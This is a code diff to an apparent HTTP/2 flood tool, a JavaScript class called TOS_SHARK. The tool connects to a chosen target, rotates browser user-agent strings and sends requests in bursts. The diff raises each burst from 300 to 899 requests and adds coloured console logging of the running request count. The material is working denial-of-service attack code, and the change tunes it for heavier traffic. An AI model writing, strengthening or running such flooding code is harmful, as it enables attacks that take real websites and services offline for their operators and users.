@@ -29,6 +29,16 @@ class TOS_SHARK {
         this.startCycle();
     }
 
+    color(text, colorCode) {
+        const colors = {
+            red: '\x1b[91m',
+            green: '\x1b[92m',
+            yellow: '\x1b[93m',
+            reset: '\x1b[0m'
+        };
+        return `${colors[colorCode] || ''}${text}${colors.reset}`;
+    }
+
     generateUserAgents() {
         return [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
@@ -104,7 +114,7 @@ class TOS_SHARK {
         try {
             const client = http2.connect(this.target);
             
-            for (let i = 0; i < 300; i++) {
+            for (let i = 0; i < 899; i++) {
                 this.sendH2Request(client);
                 this.totalReqs++;
                 this.reqCounter++;
@@ -160,7 +170,14 @@ class TOS_SHARK {
         const now = Date.now();
         if (now - this.logTimer >= 10000) {
             this.logTimer = now;
-            console.log(`TØR-2M11:${this.totalReqs} ---> ${status}`);
+            
+            let logMessage = `TØR-2M11:${this.totalReqs} ---> ${status}`;
+            
+            if (status === '*.*') {
+                logMessage = this.color(logMessage, 'red');
+            }
+            
+            console.log(logMessage);
         }
     }
 
